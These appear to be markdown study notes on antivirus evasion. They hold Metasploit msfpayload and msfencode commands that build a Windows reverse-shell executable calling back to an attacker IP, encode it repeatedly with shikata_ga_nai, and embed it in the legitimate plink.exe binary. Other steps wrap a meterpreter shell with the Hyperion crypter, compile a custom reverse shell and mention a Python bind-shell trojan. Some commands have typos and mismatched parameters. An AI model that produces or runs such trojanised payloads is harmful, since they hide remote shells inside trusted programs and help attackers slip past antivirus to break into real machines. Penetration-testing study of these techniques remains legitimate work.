**Anti-Virus Avoidance:**

Employe black list technology:  know signatures of malware are searched in the files, system and get quarantined if found 

* Create standard payload using MSFconsole : 

```
msfpayload windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=444 X > ~/Desktop/shell_reverse.exe
```

*  Encode the payload  \(Detection of payload is less as it is encoded\):

```
msfpayload windows/shell_reverse_tcp LHOST=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -o ~/Deskstop/shell_reverse_msf_encoded.exe
```

* Embedding payload into non malicious PE executable

```
msfpayload windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=44 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -x /usr/share/windows-binaries/plink.exe -o ~/Desktop/shell_reverse_msf_encoded_embedded.exe
```

**Packers and Crypters:**

Software protection tools and crypters are often used to obfuscate to prevent reverse engineering of software.

```
cross compile :
>> i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe

Use hyperion to protect the meterpeter reverse shell
>> wine hyperion.exe ~/Desktop/crypted.exe

```

**Custom Tools:**

use tools and binaries not know to antivirus

```
i586-mingw32msvc-gcc reverse.c -o ~/Desktop/custom-reverse.exe -lws2_32
```

**Python Bind shell trojen**

Run on the port 4444 and run any command sent to this port .

cross compile using the PyInstaller

